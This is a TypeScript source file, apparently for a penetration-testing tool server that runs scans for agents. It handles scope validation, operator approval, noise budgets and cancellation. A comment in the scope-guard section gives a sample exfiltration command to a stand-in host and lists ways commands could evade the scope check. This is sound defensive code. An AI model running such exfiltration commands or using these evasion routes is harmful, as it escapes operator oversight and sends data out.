  stderrSink?: { write: (chunk: Buffer) => void };
  /** Optional live tee (e.g. the Analysis live-output buffer). Never blocks the process. */
  onStdout?: (chunk: Buffer) => void;
  onStderr?: (chunk: Buffer) => void;
  /** Operator/agent cancellation. When it aborts AFTER spawn, the child is killed
   *  (SIGTERM → SIGKILL). Previously abort only cancelled the pre-spawn approval wait,
   *  so a cancelled scan kept running to completion. */
  signal?: AbortSignal;
}): Promise<ProcessResult> {
  return new Promise((resolve) => {
    const start = Date.now();
    const stdout = new BoundedStreamBuffer();
    const stderr = new BoundedStreamBuffer();
    let timedOut = false;
    let settled = false;
    // The delayed SIGKILL escalation timer (from the timeout OR abort path). Held
    // here so it can be cleared once the child exits — otherwise it could fire 5s
    // later and signal a recycled PID/process-group.
    let killTimer: ReturnType<typeof setTimeout> | null = null;

    let child;
    try {
      child = spawn(binary, args, {
        cwd: opts.cwd,
        env: buildChildEnv(opts.env),
        stdio: ['ignore', 'pipe', 'pipe'],
        // R2-1: put the child in its own process group on POSIX so the
        // timeout path can signal the entire descendant tree via -pid.
        // Without this, bash -c 'tool & wait' style invocations leave
        // grandchildren running after Overwatch reports the action killed.
        // No-op on Windows (where spawn ignores `detached:true` for
        // signaling purposes); we document the gap rather than fake it.
        detached: process.platform !== 'win32',
      });
    } catch (err) {
      resolve({
        exit_code: null,
        signal: null,
        stdout,
        stderr,
        duration_ms: Date.now() - start,
        timed_out: false,
        spawn_error: err instanceof Error ? err.message : String(err),
      });
      return;
    }

    // Helper: kill the entire child process group (POSIX) or the direct
    // child (Windows). Returns whether the group-kill path was used.
    const killTree = (sig: NodeJS.Signals): boolean => {
      const pid = child!.pid;
      if (pid && process.platform !== 'win32') {
        try {
          // Negative PID targets the process group.
          process.kill(-pid, sig);
          return true;
        } catch {
          // Group may have already exited; fall through to direct kill.
        }
      }
      try { child!.kill(sig); } catch { /* already gone */ }
      return false;
    };

    // Escalate to SIGKILL a few seconds after SIGTERM. Captured in `killTimer` so
    // `finish()` can cancel it once the child is gone (avoids signalling a reused pid).
    const escalateKill = (): void => {
      if (killTimer) return;
      killTimer = setTimeout(() => { killTree('SIGKILL'); }, 5000);
      killTimer.unref();
    };

    const timer = setTimeout(() => {
      timedOut = true;
      killTree('SIGTERM');
      escalateKill();
    }, opts.timeout_ms);
    timer.unref();

    // Cancellation: an abort AFTER spawn terminates the child (the finding was that
    // abort only cancelled the approval wait, so cancelled scans ran to completion).
    const onAbort = (): void => {
      killTree('SIGTERM');
      escalateKill();
    };
    if (opts.signal) {
      if (opts.signal.aborted) onAbort();
      else opts.signal.addEventListener('abort', onAbort, { once: true });
    }

    // Run once when the process settles: clear all timers/listeners so nothing fires
    // against a dead (or recycled) pid, then resolve exactly once.
    const finish = (result: ProcessResult): void => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      if (killTimer) { clearTimeout(killTimer); killTimer = null; }
      opts.signal?.removeEventListener('abort', onAbort);
      resolve(result);
    };

    child.stdout?.on('data', (c: Buffer) => {
      captureStream(stdout, c);
      try { opts.stdoutSink?.write(c); } catch { /* sink errors must not kill the process */ }
      try { opts.onStdout?.(c); } catch { /* tee errors must not kill the process */ }
    });
    child.stderr?.on('data', (c: Buffer) => {
      captureStream(stderr, c);
      try { opts.stderrSink?.write(c); } catch { /* sink errors must not kill the process */ }
      try { opts.onStderr?.(c); } catch { /* tee errors must not kill the process */ }
    });

    child.on('error', (err) => {
      finish({
        exit_code: null,
        signal: null,
        stdout,
        stderr,
        duration_ms: Date.now() - start,
        timed_out: timedOut,
        spawn_error: err.message,
      });
    });

    child.on('close', (code, signal) => {
      finish({
        exit_code: code,
        signal,
        stdout,
        stderr,
        duration_ms: Date.now() - start,
        timed_out: timedOut,
      });
    });
  });
}

export interface InstrumentedProcessOpts {
  // Spawn shape
  binary: string;
  args: string[];
  /** Human-readable representation of the command (used for description and evidence detail). */
  command_repr: string;
  cwd?: string;
  env?: Record<string, string>;
  timeout_ms?: number;

  // Lifecycle metadata
  action_id?: string;
  frontier_item_id?: string;
  agent_id?: string;
  description?: string;
  tool_name?: string;
  technique?: string;
  target_node?: string;
  target_node_ids?: string[];
  target_ip?: string;
  target_ips?: string[];
  target_cidr?: string;
  target_cidrs?: string[];
  target_url?: string;
  cloud_resource?: string;
  validate?: boolean;
  /**
   * When true, the raw `args` array is NOT written to the action-lifecycle
   * events (details.args) or the tool response — only the caller-supplied
   * `command_repr` (which the caller must pre-redact) represents the command.
   * Set this (as test_webapp_credential does) for tools whose argv carries a
   * secret so the plaintext secret never lands in the persisted activity log.
   * The real argv is still used to spawn the process.
   */
  redact_args_in_log?: boolean;
  /**
   * Secret strings to scrub from the captured stdout/stderr before they feed
   * the parser, the tool response, or a parser-exception echo — defends against
   * a target that reflects a submitted credential back in its response body.
   */
  redact_secrets?: string[];
  /** Operator override: skip the fail-closed check for unverified host/service/share targets. */
  allow_unverified_scope?: boolean;
  /** Local operator infrastructure helper command (listeners, bridges, port cleanup). */
  operator_infra?: boolean;
  parse_with?: string;
  parser_context?: ParseContext;
  /**
   * Which captured stream feeds the parser.
   *  - `stdout` (default for most parsers): only stdout.
   *  - `stderr`: only stderr (for tools that emit machine-readable output to stderr).
   *  - `combined`: stdout + stderr concatenated.
   *  - `auto`: stdout if non-empty, else stderr.
   */
  parse_stream?: 'stdout' | 'stderr' | 'combined' | 'auto';
  noise_estimate?: number;

  /**
   * Tool name reported in MCP error responses / activity descriptions. Distinct
   * from `tool_name` (technique attribution); this identifies which Overwatch
   * tool wrapper invoked the runner (`run_bash` or `run_tool`).
   */
  invoking_tool: 'run_bash' | 'run_tool';

  /**
   * Per-request AbortSignal from the MCP SDK (`extra.signal`). If the requesting
   * client disconnects / cancels while this action is blocked on operator
   * approval, the pending approval resolves as 'aborted' and the action is not
   * executed, instead of orphaning the request until the approval timeout.
   */
  abortSignal?: AbortSignal;
}

export interface InstrumentedProcessResponse {
  content: Array<{ type: 'text'; text: string }>;
  isError?: boolean;
  [key: string]: unknown;
}

/**
 * Execute a child process with full action-lifecycle instrumentation.
 * Returns an MCP-shaped tool response.
 */
// How often to refresh a tool-blocked agent's heartbeat. Well under both the
// default 120s TTL and the headless 300s startup TTL, so a long scan never lets
// the beat go stale.
const AGENT_KEEPALIVE_INTERVAL_MS = 45_000;
// Hard ceiling on how long a SINGLE tool call may keep an agent's heartbeat fresh.
// Bounds the window in which a crashed-mid-tool agent — whose server-side tool
// keeps running detached — stays un-reaped: past this, the keepalive stops and
// normal TTL reaping resumes even if the tool is still going (its output is still
// salvaged when it ends). Comfortably exceeds any legitimate single scan.
const AGENT_KEEPALIVE_MAX_MS = 30 * 60_000;
const PERSISTENCE_GATE_POLL_MS = 250;

interface ExecutionAbortMonitor {
  signal: AbortSignal;
  /** Recheck synchronously at command boundaries and remember degradation even
   * if persistence later recovers before the child has finished exiting. */
  checkPersistence(): boolean;
  persistenceInterrupted(): boolean;
  dispose(): void;
}

/**
 * Merge request cancellation with the asynchronous persistence write gate.
 * Direct MCP run_tool/run_bash calls are not owned by TaskExecutionService, so
 * its process registry cannot stop them when persistence trips read-only. This
 * monitor gives every instrumented child the same fail-closed behavior.
 */
function createExecutionAbortMonitor(
  engine: GraphEngine,
  callerSignal?: AbortSignal,
): ExecutionAbortMonitor {
  const controller = new AbortController();
  let persistenceDegraded = false;

  const onCallerAbort = (): void => {
    if (!controller.signal.aborted) controller.abort(callerSignal?.reason);
  };
  if (callerSignal?.aborted) onCallerAbort();
  else callerSignal?.addEventListener('abort', onCallerAbort, { once: true });

  const checkPersistence = (): boolean => {
    if (persistenceDegraded) return false;
    if (engine.isPersistenceWritable()) return true;
    persistenceDegraded = true;
    if (!controller.signal.aborted) {
      controller.abort(new Error('Persistence became read-only while the process was running'));
    }
    return false;
  };

  checkPersistence();
  const timer = setInterval(checkPersistence, PERSISTENCE_GATE_POLL_MS);
  timer.unref?.();

  return {
    signal: controller.signal,
    checkPersistence,
    persistenceInterrupted: () => persistenceDegraded,
    dispose: () => {
      clearInterval(timer);
      callerSignal?.removeEventListener('abort', onCallerAbort);
    },
  };
}

function persistenceInterruptedResponse(
  engine: GraphEngine,
  actionId: string | undefined,
  details: Record<string, unknown> = {},
): InstrumentedProcessResponse {
  return {
    content: [{
      type: 'text',
      text: JSON.stringify({
        action_id: actionId,
        executed: false,
        interrupted: true,
        code: 'PERSISTENCE_READ_ONLY',
        reason: 'persistence_degraded',
        error: 'Target execution was interrupted because durable persistence became read-only.',
        recovery: engine.getPersistenceRecoveryStatus(),
        ...details,
      }, null, 2),
    }],
    isError: true,
  };
}

/**
 * Keep a running agent's heartbeat fresh while it blocks on a long-running tool.
 * An agent awaiting a server-side scan (nmap / subfinder / httpx / nuclei over
 * many hosts) can't call agent_heartbeat itself, so the watchdog would otherwise
 * reap it mid-scan as "stale" and mark it interrupted. Bumps immediately, then on
 * an interval, using the SAME silent-keepalive the supervisor uses for the
 * orchestrator (in-memory beat + lease renewal, no event / disk write). Returns a
 * disposer the caller MUST invoke when the tool returns; after that, normal
 * reaping resumes if the agent goes idle without beating. No-op for a blank
 * agent_id. Bounded two ways so a genuinely-wedged agent still gets reaped: the
 * caller stops it when the process returns (the tool's own timeout ends that), and
 * `maxMs` caps the lifetime even if the tool never returns — this only keeps a
 * HEALTHY long scan alive, it can't prop up a dead agent indefinitely.
 * `intervalMs`/`maxMs` are injectable for tests.
 */
export function startAgentKeepalive(
  engine: GraphEngine,
  agentId?: string,
  opts?: { intervalMs?: number; maxMs?: number },
): () => void {
  if (!agentId) return () => { /* no agent to keep alive */ };
  const intervalMs = opts?.intervalMs ?? AGENT_KEEPALIVE_INTERVAL_MS;
  const maxMs = opts?.maxMs ?? AGENT_KEEPALIVE_MAX_MS;
  const startedAt = Date.now();
  let timer: ReturnType<typeof setInterval> | null = null;
  const stop = (): void => { if (timer) { clearInterval(timer); timer = null; } };
  const bump = (): void => {
    // Stop propping the agent up past the ceiling — a still-blocked agent beyond
    // this is treated as potentially wedged and handed back to TTL reaping.
    if (Date.now() - startedAt > maxMs) { stop(); return; }
    const task = engine.getAgentTasks().find(t => t.agent_id === agentId && t.status === 'running');
    if (!task) return;
    try { engine.agentHeartbeat(task.id, undefined, { silent: true }); } catch { /* keepalive is best-effort */ }
  };
  bump();
  timer = setInterval(bump, intervalMs);
  // Don't let the keepalive timer hold the event loop open on shutdown.
  if (typeof timer.unref === 'function') timer.unref();
  return stop;
}

export async function runInstrumentedProcess(
  engine: GraphEngine,
  opts: InstrumentedProcessOpts,
): Promise<InstrumentedProcessResponse> {
  const {
    binary, args, command_repr,
    cwd, env,
    action_id,
    frontier_item_id,
    agent_id,
    description,
    tool_name: rawToolName,
    technique,
    target_node,
    target_node_ids,
    target_ip,
    target_ips,
    target_cidr,
    target_cidrs,
    target_url,
    cloud_resource,
    validate,
    parse_with,
    parser_context,
    parse_stream,
    noise_estimate: noiseOverride,
    redact_args_in_log,
    redact_secrets,
    allow_unverified_scope,
    operator_infra,
    abortSignal,
  } = opts;

  // ToolRegistrar rejects new MCP calls, but service-internal callers also use
  // this runner directly. Refuse before allocating IDs or changing lifecycle
  // state when the durable write gate is already closed.
  if (!engine.isPersistenceWritable()) {
    return persistenceInterruptedResponse(engine, action_id);
  }

  // When redaction is requested the raw argv (which may carry a secret) is
  // withheld from the persisted events + tool response; command_repr (which
  // the caller pre-redacts) is the sole command representation. The real
  // `args` is still passed to spawn().
  const loggedArgs = redact_args_in_log ? undefined : args;

  // Auto-register a synthetic running task for this agent_id if none
  // exists. Lets sub-agents that bypass `register_agent` /
  // `dispatch_agents` (e.g. Claude Code's built-in Agent tool) still
  // surface on the dashboard's AgentsPanel. No-op when agent_id is blank
  // or already registered.
  engine.ensureRunningAgent(agent_id);

  // P1.2: when the engagement carries a nonce, derive action_id
  // deterministically from (nonce | agent_id | now | command | seq).
  // Otherwise fall through to uuidv4 — strict migration: legacy
  // engagements (pre-nonce) keep their UUID-based action IDs forever.
  const ctxConfig = engine.getConfig();
  const nowForId = engine.now();
  const normalizedActionId = action_id || actionIdOrUuid(
    ctxConfig.engagement_nonce
      ? {
        engagement_nonce: ctxConfig.engagement_nonce,
        agent_id,
        timestamp: nowForId,
        command_signature: command_repr,
        sequence: engine.nextDeterministicSeq(),
      }
      : null,
  );
  const tool_name = rawToolName || command_repr.trim().split(/\s+/)[0] || binary;
  const resolvedDescription = description || command_repr;
  const effectiveTimeout = opts.timeout_ms ?? resolveDefaultActionTimeoutMs();
  const shouldValidate = validate !== false;
  const allTargetNodeIds = [
    ...(target_node ? [target_node] : []),
    ...(target_node_ids ?? []),
  ].filter((v, i, a) => a.indexOf(v) === i);
  const allTargetIps = [
    ...(target_ip ? [target_ip] : []),
    ...(target_ips ?? []),
  ].filter((v, i, a) => a.indexOf(v) === i);
  const allTargetCidrs = [
    ...(target_cidr ? [target_cidr] : []),
    ...(target_cidrs ?? []),
  ].filter((v, i, a) => a.indexOf(v) === i);
  const observedTargetCidrs = new Set(allTargetCidrs);
  const targetCidrsForEvents = (): string[] | undefined => {
    const values = [...observedTargetCidrs];
    return values.length > 0 ? values : undefined;
  };
  // Mirror of observedTargetCidrs for IPs/hostnames: implicitly-sniffed hosts
  // are folded in here so the action_validated/action_failed events report the
  // target that actually drove a scope decision (not just the declared ones).
  const observedTargetIps = new Set(allTargetIps);
  const targetIpsForEvents = (): string[] | undefined => {
    const values = [...observedTargetIps];
    return values.length > 0 ? values : undefined;
  };
  const frontierType = frontier_item_id ? engine.getFrontierItem(frontier_item_id)?.type : undefined;

  // ---- 1. Validation ----
  // Validate every target in the action — not just the singular target_node /
  // target_ip. A command like `nmap 8.8.8.8 9.9.9.9` arrives via target_ips
  // and must be scope-checked per-IP; otherwise out-of-scope hosts can ride
  // along inside a multi-target invocation. We dedupe per (kind,value),
  // run validateAction once per target, and aggregate errors/warnings.
  let noiseEstimate = noiseOverride;
  if (shouldValidate) {
    const validationTargets: Array<Parameters<typeof engine.validateAction>[0]> = [];
    for (const id of allTargetNodeIds) validationTargets.push({ target_node: id, technique, allow_unverified_scope });
    for (const ip of allTargetIps) validationTargets.push({ target_ip: ip, technique, allow_unverified_scope });
    for (const cidr of allTargetCidrs) validationTargets.push({ target_cidr: cidr, technique, allow_unverified_scope });
    if (target_url) validationTargets.push({ target_url, technique, allow_unverified_scope });
    if (cloud_resource) validationTargets.push({ cloud_resource, technique, allow_unverified_scope });

    // Scope guard: sniff implicit targets from the FULL command whenever the
    // action is target-facing OR invokes a network-capable binary — detected
    // across every shell segment and behind any wrapper prefix (see
    // commandInvokesBinary), not just from the first command token. Discovered
    // targets are merged into the validation set so the per-target
    // validateAction loop below scope-checks each and fails closed on anything
    // out of scope. This closes three bypasses:
    //   - wrapper prefix:      proxychains|sudo|env|timeout … nmap 10/8
    //   - compound command:    echo ok; curl https://evil.example/exfil
    //   - suppression by one:  passing one in-scope target used to skip the
    //                          sniff, letting OTHER embedded hosts ride along.
    // Shell-only binaries that merely mention a URL/IP (echo, cat, …) are not
    // classified as target-facing/network-capable, so benign log lines run.
    const techniqueFacing = isTargetFacing(technique, '', '');
    const targetFacing = techniqueFacing
      || isTargetFacing('', tool_name, binary)
      || commandInvokesBinary(command_repr, b => TARGET_FACING_BINARIES_LC.has(b));
    const networkCapable = isNetworkCapableBinary(tool_name, binary)
      || commandInvokesBinary(command_repr, b => NETWORK_CAPABLE_BINARIES_LC.has(b));

    if (!operator_infra && (targetFacing || networkCapable)) {
      // Value-flag-aware, per-segment extraction: only POSITIONAL operands are
      // scope-checked, so incidental option values (-H headers, -e referer,
      // --script files, -o output) never false-block — which lets us merge
      // EVERY discovered target (IP/CIDR/URL/host), even alongside an explicit
      // one, so an embedded out-of-scope host [H-11] and a later
      // compound-command egress are both caught.
      const implicit = extractImplicitTargets(command_repr, techniqueFacing);
      const seenIps = new Set(allTargetIps);
      const seenUrls = new Set(target_url ? [target_url] : []);
      for (const ip of implicit.ips) {
        if (seenIps.has(ip)) continue;
        seenIps.add(ip);
        observedTargetIps.add(ip);
        validationTargets.push({ target_ip: ip, technique, allow_unverified_scope });
      }
      for (const cidr of implicit.cidrs) {
        if (observedTargetCidrs.has(cidr)) continue;
        observedTargetCidrs.add(cidr);
        validationTargets.push({ target_cidr: cidr, technique, allow_unverified_scope });
      }
      for (const u of implicit.urls) {
        if (seenUrls.has(u)) continue;
        seenUrls.add(u);
        validationTargets.push({ target_url: u, technique, allow_unverified_scope });
      }
      for (const h of implicit.hostnames) {
        if (seenIps.has(h)) continue;
        seenIps.add(h);
        observedTargetIps.add(h);
        // Hostnames go through target_ip (validateAction resolves both forms).
        validationTargets.push({ target_ip: h, technique, allow_unverified_scope });
      }

      // Fail closed on a positional host operand we could NOT resolve to a
      // scope-checkable target (a bare single-label host `ssh dc01`, a
      // ::-collapsed IPv6, a numeric-encoded IP, or an `-iL` target file) on a
      // simple host-first binary (ssh/nc/telnet/…). Independent of whether OTHER
      // targets resolved — an unresolvable jump/host alongside an in-scope
      // target still fails closed — but skipped under allow_unverified_scope.
      if (implicit.unresolvedHostOperand && !allow_unverified_scope) {
        engine.logActionEvent({
          description: 'Refused: unresolved host operand with no scope metadata',
          agent_id,
          action_id: normalizedActionId,
          event_type: 'action_failed',
          category: 'frontier',
          tool_name,
          technique,
          frontier_item_id,
          result_classification: 'failure',
          details: {
            reason: 'unresolved_target_without_scope',
            hint: 'Pass target_ip/target_url/target_node explicitly, or set allow_unverified_scope=true if the operand is not an engagement target.',
          },
        });
        engine.persist();
        return {
          content: [{
            type: 'text',
            text: JSON.stringify({
              action_id: normalizedActionId,
              executed: false,
              validation_result: 'invalid',
              errors: [
                'unresolved_target_without_scope: a network command references a host that could not be scope-checked (bare hostname, collapsed IPv6, or numeric IP). Pass target_ip/target_url/target_node explicitly, or set allow_unverified_scope=true if it is not a target.',
              ],
            }, null, 2),
          }],
          isError: true,
        };
      }
    }

    if (validationTargets.length === 0) validationTargets.push({ technique, allow_unverified_scope });

    const aggregatedErrors: string[] = [];
    const aggregatedWarnings: string[] = [];
    let worstOpsecContext: ReturnType<typeof engine.validateAction>['opsec_context'] | undefined;
    let aggregateValid = true;
    // Pick the "worst" per-target OPSEC context to drive the approval gate.
    // Otherwise a multi-target action whose last target is clean would skip
    // approval even when an earlier target is under defensive pressure.
    // Severity ordering, most restrictive first:
    //   1. lower noise_budget_remaining wins (less headroom = more pressure)
    //   2. quiet > normal > loud recommended_approach
    //   3. more defensive_signals wins
    const approachRank = { quiet: 2, normal: 1, loud: 0 } as const;
    const isWorse = (a: typeof worstOpsecContext, b: typeof worstOpsecContext): boolean => {
      if (!a) return true;
      if (!b) return false;
      if (a.noise_budget_remaining !== b.noise_budget_remaining) {
        return b.noise_budget_remaining < a.noise_budget_remaining;
      }
      const ar = approachRank[a.recommended_approach];
      const br = approachRank[b.recommended_approach];
      if (ar !== br) return br > ar;
      return (b.defensive_signals?.length ?? 0) > (a.defensive_signals?.length ?? 0);
    };
    for (const t of validationTargets) {
      const r = engine.validateAction(t);
      if (isWorse(worstOpsecContext, r.opsec_context)) {
        worstOpsecContext = r.opsec_context;
      }
      if (!r.valid) aggregateValid = false;
      for (const e of r.errors) if (!aggregatedErrors.includes(e)) aggregatedErrors.push(e);
      for (const w of r.warnings) if (!aggregatedWarnings.includes(w)) aggregatedWarnings.push(w);
    }
    const v = {
      valid: aggregateValid,
      errors: aggregatedErrors,
      warnings: aggregatedWarnings,
      opsec_context: worstOpsecContext!,
    };

    // 0.3: noise estimation + ceiling enforcement. OPSEC is opt-in: when
    // `opsec.enabled !== true`, the entire noise-budget pipeline stays inert
    // — no per-technique default substitution, no recording, no ceiling
    // rejection. The caller can still opt in for a single action by passing
    // an explicit `noise_estimate`, in which case we honor and record it
    // (without enforcing a ceiling). Only when OPSEC is enabled do we both
    // substitute defaults for missing estimates AND reject actions that
    // would exceed `max_noise`.
    //
    // This replaces the prior buggy fallback (`noiseEstimate = global_noise_spent`),
    // which was always-on and double-counted cumulative spend back onto each
    // action.
    const opsecEnabled = engine.isOpsecEnforcementEnabled();
    if (noiseEstimate === undefined && opsecEnabled) {
      noiseEstimate = technique
        ? (TECHNIQUE_NOISE_DEFAULTS[technique] ?? UNKNOWN_TECHNIQUE_DEFAULT_NOISE)
        : UNKNOWN_TECHNIQUE_DEFAULT_NOISE;
    }
    if (opsecEnabled && typeof noiseEstimate === 'number' && noiseEstimate > 0) {
      const maxNoise = engine.getMaxNoise();
      const headroom = v.opsec_context.noise_budget_remaining;
      if (noiseEstimate > headroom) {
        const ceilingMsg =
          `Action exceeds OPSEC noise ceiling: estimate ${noiseEstimate.toFixed(3)} ` +
          `> remaining budget ${headroom.toFixed(3)} (max_noise=${maxNoise}, ` +
          `spent=${v.opsec_context.global_noise_spent.toFixed(3)}).`;
        v.errors.push(ceilingMsg);
        v.valid = false;
      }
    }
    const validationResult = !v.valid ? 'invalid' : v.warnings.length > 0 ? 'warning_only' : 'valid';

    engine.logActionEvent({
      description: resolvedDescription,
      agent_id,
      action_id: normalizedActionId,
      event_type: 'action_validated',
      category: 'frontier',
      frontier_type: frontierType,
      tool_name,
      technique,
      target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
      target_ips: targetIpsForEvents(),
      target_cidrs: targetCidrsForEvents(),
      frontier_item_id,
      validation_result: validationResult,
      noise_estimate: noiseEstimate,
      result_classification: !v.valid ? 'failure' : v.warnings.length > 0 ? 'partial' : 'success',
      details: { errors: v.errors, warnings: v.warnings, opsec_context: v.opsec_context },
    });

    if (!v.valid) {
      engine.logActionEvent({
        description: `Refused to execute: ${resolvedDescription}`,
        agent_id,
        action_id: normalizedActionId,
        event_type: 'action_failed',
        category: 'frontier',
        frontier_type: frontierType,
        tool_name,
        technique,
        target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
        target_ips: targetIpsForEvents(),
        target_cidrs: targetCidrsForEvents(),
        frontier_item_id,
        result_classification: 'failure',
        details: { reason: 'validation_failed', validation_errors: v.errors },
      });
      engine.persist();
      return {
        content: [{
          type: 'text',
          text: JSON.stringify({
            action_id: normalizedActionId,
            executed: false,
            validation_result: 'invalid',
            errors: v.errors,
            warnings: v.warnings,
          }, null, 2),
        }],
        isError: true,
      };
    }

    // Approval gate
    const queue = engine.getPendingActionQueue();
    // P4.1: pass the phase-effective approval config so per-phase overrides
    // (e.g., approve-all during exploitation) are honored. The action context
    // (target ip/node/technique) also lets operator-policy approval rules
    // escalate the mode (e.g. approve-all on a production subnet).
    if (queue.needsApproval(v.opsec_context, technique, engine.getEffectiveApprovalConfig({ ip: target_ip, nodeId: target_node, technique }))) {
      const pendingApproval = {
        action_id: normalizedActionId,
        technique,
        target_node,
        target_ip,
        target_cidr,
        description: resolvedDescription,
        opsec_context: v.opsec_context,
        validation_result: validationResult as 'valid' | 'warning_only',
        frontier_item_id,
        agent_id,
      };
      engine.recordApprovalRequest(pendingApproval);
      // Approval can remain pending for minutes. Couple that wait to the live
      // persistence gate as well as the MCP caller signal so an invocation
      // cannot resume and spawn after durability has gone read-only.
      const approvalAbort = createExecutionAbortMonitor(engine, abortSignal);
      let approval: Awaited<ReturnType<typeof queue.submit>>;
      try {
        approval = await queue.submit(pendingApproval, { signal: approvalAbort.signal });
      } finally {
        approvalAbort.dispose();
      }
      if (approvalAbort.persistenceInterrupted() || !engine.isPersistenceWritable()) {
        return persistenceInterruptedResponse(engine, normalizedActionId, {
          approval_status: approval.status,
        });
      }
      engine.resolveApprovalRequest(approval);

      engine.logActionEvent({
        description: approval.unattended_execute
          ? `Action auto-approved on timeout (unattended): ${resolvedDescription}`
          : `Action ${approval.status}: ${resolvedDescription}`,
        agent_id,
        action_id: normalizedActionId,
        event_type: 'action_validated',
        category: 'frontier',
        frontier_item_id,
        result_classification: approval.status === 'denied' || approval.status === 'aborted' ? 'failure' : 'success',
        details: {
          approval_status: approval.status,
          operator_notes: approval.operator_notes,
          reason: approval.reason,
          auto_approved: approval.auto_approved,
          unattended_execute: approval.unattended_execute,
        },
      });

      // Both 'denied' (operator decision) and 'aborted' (client disconnected
      // before a decision) block execution — the command must not run.
      if (approval.status === 'denied' || approval.status === 'aborted') {
        const aborted = approval.status === 'aborted';
        engine.logActionEvent({
          description: aborted
            ? `Approval aborted (client disconnected): ${resolvedDescription}`
            : `Operator denied: ${resolvedDescription}`,
          agent_id,
          action_id: normalizedActionId,
          event_type: 'action_failed',
          category: 'frontier',
          frontier_item_id,
          tool_name,
          technique,
          target_cidrs: targetCidrsForEvents(),
          result_classification: 'failure',
          details: aborted
            ? { reason: 'approval_aborted', approval_reason: approval.reason }
            : { reason: 'operator_denied', approval_reason: approval.reason },
        });
        engine.persist();
        return {
          content: [{
            type: 'text',
            text: JSON.stringify({
              action_id: normalizedActionId,
              executed: false,
              approval_status: approval.status,
              reason: approval.reason,
            }, null, 2),
          }],
          isError: true,
        };
      }
    }
  }

  // ---- 2. action_started ----
  // Approval can wait for minutes. Recheck after that wait and immediately
  // before the durable start record so a stale invocation cannot cross into a
  // new read-only persistence generation.
  if (!engine.isPersistenceWritable()) {
    return persistenceInterruptedResponse(engine, normalizedActionId);
  }
  try {
    engine.logActionEvent({
      description: resolvedDescription,
      agent_id,
      action_id: normalizedActionId,
      event_type: 'action_started',
      category: 'frontier',
      frontier_type: frontierType,
      tool_name,
      technique,
      command_repr,
      target_node_ids: allTargetNodeIds.length > 0 ? allTargetNodeIds : undefined,
      target_ips: targetIpsForEvents(),
      target_cidrs: targetCidrsForEvents(),
      frontier_item_id,
      noise_estimate: noiseEstimate,
      details: {
        command: command_repr,
        binary,
        args: loggedArgs,
        cwd,
        timeout_ms: effectiveTimeout,
        invoking_tool: opts.invoking_tool,
        operator_infra: operator_infra || undefined,
      },
    });
    if (noiseEstimate !== undefined) {
      engine.recordOpsecNoise({
        action_id: normalizedActionId,
        host_id: allTargetNodeIds[0],
        agent_id,
        frontier_item_id,
        noise_estimate: noiseEstimate,
      });
    }
    engine.persist();
  } catch (error) {
    if (!engine.isPersistenceWritable()) {
      return persistenceInterruptedResponse(engine, normalizedActionId);
    }
    throw error;
  }

  // ---- 3. Execute ----
  // Phase H: pipe stdout/stderr to evidence files as the process runs so
  // the full-fidelity output is captured even when it exceeds the in-memory
  // BoundedStreamBuffer cap. The bounded buffer still drives the inline
  // tool response and truncation flags; the streamed evidence files hold
  // the complete bytes for later inspection via get_evidence.
  const evidenceStore = engine.getEvidenceStore();
  const stdoutSink = evidenceStore.createBlobStream({
    action_id: normalizedActionId,
    agent_id,
    evidence_type: 'command_output',
    filename: 'stdout',
    kind: 'raw_output',
  });
  const stderrSink = evidenceStore.createBlobStream({
    action_id: normalizedActionId,
    agent_id,
    evidence_type: 'command_output',
    filename: 'stderr',
    kind: 'raw_output',
  });
  // Live-output buffer: tee chunks so the Analysis workspace can stream a
  // running action in real time. Durable bytes still go to the evidence sinks.
  const liveOutput = engine.getActionOutputBuffer();
  liveOutput.open(normalizedActionId);
  // Keep the calling agent's heartbeat fresh WHILE this (possibly long) tool runs.
  // A headless sub-agent blocked awaiting a server-side scan can't call
  // agent_heartbeat itself, so without this the watchdog reaps it mid-scan —
  // network-recon / osint / web-discovery tools (nmap, subfinder, httpx, nuclei)
  // routinely exceed the heartbeat TTL. Stopped the instant the process returns
  // (which the tool's own `effectiveTimeout` guarantees), and self-caps at
  // AGENT_KEEPALIVE_MAX_MS so it can't prop up a crashed-mid-tool agent forever.
  // Last synchronous gate check before spawn. The 250ms monitor owns the race
  // after this point and aborts the entire child process group on transition.
  const executionAbort = createExecutionAbortMonitor(engine, abortSignal);
  if (!executionAbort.checkPersistence()) {
    await Promise.allSettled([stdoutSink.end(), stderrSink.end()]);
    liveOutput.markDone(normalizedActionId);
    executionAbort.dispose();
    return persistenceInterruptedResponse(engine, normalizedActionId);
  }
  const stopAgentKeepalive = startAgentKeepalive(engine, agent_id);
  let result: ProcessResult;
  try {
    result = await runProcess(binary, args, {
      cwd,
      env,
      timeout_ms: effectiveTimeout,
      // Wire cancellation through: aborting the tool call now kills the running child.
      signal: executionAbort.signal,
      stdoutSink,
      stderrSink,
      // Scrub reflected secrets from the live dashboard tee too (per-chunk; a
      // secret straddling a chunk boundary in the live stream is a documented
      // residual — the persisted response/parser paths scrub the full text).
      onStdout: (c) => liveOutput.append(normalizedActionId, 'stdout', redact_secrets?.length ? scrubSecretsFromText(c.toString('utf8'), redact_secrets) : c),
      onStderr: (c) => liveOutput.append(normalizedActionId, 'stderr', redact_secrets?.length ? scrubSecretsFromText(c.toString('utf8'), redact_secrets) : c),
    });
  } finally {
    stopAgentKeepalive();
  }
  const stdoutInfo = joinAndCap(result.stdout, STREAM_INLINE_CAP);
  const stderrInfo = joinAndCap(result.stderr, STREAM_INLINE_CAP);
  // Scrub caller-supplied secrets from the text that reaches the tool response
  // (the stored evidence blob is redacted separately at report time).
  if (redact_secrets?.length) {
    stdoutInfo.text = scrubSecretsFromText(stdoutInfo.text, redact_secrets);
    stderrInfo.text = scrubSecretsFromText(stderrInfo.text, redact_secrets);
  }

  // ---- 4. Finalize evidence ----
  // The streaming sinks always emit a manifest record (so action lifecycle
  // events can reference them by ID) but we only surface the IDs in the
  // lifecycle event when there was actually output to record.
  // Sink finalization may reject if a write failed (ENOSPC, EIO, etc.).
  // We capture the error rather than throwing so the action lifecycle
  // event can record `evidence_capture_error` instead of silently
  // claiming evidence that does not exist.
  const finalizeResults = await Promise.allSettled([stdoutSink.end(), stderrSink.end()]);
  const stdoutCaptureError = finalizeResults[0].status === 'rejected'
    ? (finalizeResults[0].reason instanceof Error
        ? finalizeResults[0].reason.message
        : String(finalizeResults[0].reason))
    : (stdoutSink.error()?.message);
